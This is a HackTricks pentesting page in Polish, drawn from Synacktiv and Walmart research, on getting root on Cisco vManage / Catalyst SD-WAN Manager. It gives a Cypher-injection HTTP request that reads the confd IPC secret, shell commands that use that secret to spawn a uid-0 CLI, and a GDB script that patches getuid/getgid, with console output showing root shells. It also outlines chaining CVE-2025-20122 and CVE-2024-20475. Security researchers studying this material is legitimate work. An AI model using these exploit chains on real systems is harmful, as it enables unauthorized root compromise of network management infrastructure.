# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## Path 1

(Przykład z [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Po krótkim przeszukaniu [documentation](http://66.218.245.39/doc/html/rn03re18.html) związanego z `confd` i różnymi binariami (dostępnymi po zalogowaniu na stronie Cisco), odkryliśmy, że do uwierzytelniania gniazda IPC używa sekretu znajdującego się w `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Pamiętasz naszą instancję Neo4j? Działa ona z uprawnieniami użytkownika `vmanage`, co pozwala nam pobrać plik, wykorzystując poprzednią vulnerability:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Program `confd_cli` nie obsługuje argumentów w wierszu poleceń, ale wywołuje `/usr/bin/confd_cli_user` z argumentami. Możemy więc bezpośrednio wywołać `/usr/bin/confd_cli_user` z naszym zestawem argumentów. Jednak nie jest on czytelny przy naszych obecnych uprawnieniach, więc musimy pobrać go z rootfs i skopiować za pomocą scp, przeczytać pomoc i użyć go do uzyskania shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Ścieżka 2

(Przykład z [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Blog¹ zespołu synacktiv opisał elegancki sposób uzyskania powłoki root, ale z zastrzeżeniem, że wymaga on zdobycia kopii `/usr/bin/confd_cli_user`, która jest czytelna tylko przez root. Znalazłem inny sposób eskalacji do root bez takiego kłopotu.

Kiedy zdysasemblowałem plik binarny `/usr/bin/confd_cli`, zauważyłem następujące:

<details>
<summary>Objdump pokazujący odczyt UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Kiedy uruchamiam „ps aux”, zauważyłem następujące (_uwaga -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Założyłem, że program „confd_cli” przekazuje ID użytkownika i ID grupy zebrane od zalogowanego użytkownika do aplikacji „cmdptywrapper”.

Moje pierwsze podejście polegało na uruchomieniu „cmdptywrapper” bezpośrednio i przekazaniu mu `-g 0 -u 0`, ale zakończyło się niepowodzeniem. Wygląda na to, że gdzieś po drodze został utworzony file descriptor (-i 1015) i nie mogę go sfałszować.

Jak wspomniano w synacktiv’s blog(last example), program `confd_cli` nie obsługuje command line argument, ale mogę na niego wpłynąć przy pomocy debuggera, a na systemie na szczęście jest GDB.

Utworzyłem skrypt GDB, w którym wymusiłem, żeby API `getuid` i `getgid` zwracały 0. Ponieważ już mam przywilej „vmanage” dzięki deserialization RCE, mam bezpośredni dostęp do odczytu `/etc/confd/confd_ipc_secret`.

/root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Wyjście konsoli:

<details>
<summary>Wyjście konsoli</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug)

Cisco przemianował vManage na *Catalyst SD-WAN Manager*, ale warstwa CLI nadal działa na tej samej maszynie. Komunikat bezpieczeństwa z 2025 r. (CVE-2025-20122) opisuje niewystarczającą walidację danych wejściowych w CLI, która pozwala **dowolnemu uwierzytelnionemu lokalnemu użytkownikowi** uzyskać root poprzez wysłanie spreparowanego żądania do usługi CLI menedżera. Połącz dowolne low-priv foothold (np. Neo4j deserialization z Path1 lub cron/backup user shell) z tą luką, aby wskoczyć na root bez kopiowania `confd_cli_user` lub podłączania GDB:

1. Użyj swojej low-priv powłoki, aby zlokalizować punkt końcowy IPC CLI (zazwyczaj nasłuch `cmdptywrapper` widoczny na porcie 4565 w Path2).
2. Sporządź żądanie CLI, które sfałszuje pola UID/GID ustawiając je na 0. Błąd walidacji nie wymusza UID pierwotnego wywołującego, więc wrapper uruchamia PTY działające z prawami roota.
3. Przepuść dowolną sekwencję poleceń (`vshell; id`) przez spreparowane żądanie, aby uzyskać root shell.

> Powierzchnia ataku jest tylko lokalna; remote code execution jest nadal wymagane, aby uzyskać początkową powłokę, ale po wejściu do systemu eksploatacja sprowadza się do pojedynczej wiadomości IPC zamiast debugger-based UID patch.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

* **Authenticated UI XSS (CVE-2024-20475)** – Wstrzyknięcie JavaScript w konkretne pola interfejsu; przejęcie sesji administratora daje ścieżkę prowadzoną przez przeglądarkę do `vshell` → local shell → Path3 do roota.

## References

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
